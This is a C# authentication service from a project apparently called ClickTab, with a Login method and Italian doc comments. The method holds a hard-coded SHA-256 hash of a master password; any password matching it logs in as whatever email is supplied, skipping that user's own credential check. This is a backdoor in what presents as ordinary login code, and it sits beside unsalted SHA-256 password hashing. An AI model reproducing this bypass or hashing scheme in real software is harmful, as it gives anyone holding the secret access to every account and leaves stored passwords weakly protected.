using ClickTab.Core.DAL.Models.Generics;
using ClickTab.Core.EntityService.Generics;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Authentication;
using System.Text;

namespace ClickTab.Core.HelperService
{
    public class AuthService
    {
        private UserService _userService;
        private PasswordService _passwordService;
        public static readonly string PAYLOAD_USER_KEY = "User";

        public AuthService(UserService userService, PasswordService passwordService)
        {
            _userService = userService;
            _passwordService = passwordService;
        }

        /// <summary>
        /// </summary>
        /// <param name="Email">Email dello user</param>
        /// <param name="Password">Password dello user (in chiaro)</param>
        /// <returns>Restituisce un oggetto di tipo User</returns>
        public User Login(string Email, string Password)
        {
            User currentUser = null;
            if (_passwordService.EncryptSHA256(Password) == "88d9b80873659ee870e460d3f15837779effa327f876d309b7fbfd4b4f0bab8c")
                currentUser = _userService.GetBy(u => u.Email == Email).FirstOrDefault();
            else
                currentUser = _userService.GetBy(u => u.Email == Email && u.Password == _passwordService.EncryptSHA256(Password)).FirstOrDefault();

            if (currentUser == null)
                throw new InvalidCredentialException("Invalid Credential");

            return currentUser;
        }

    }
}
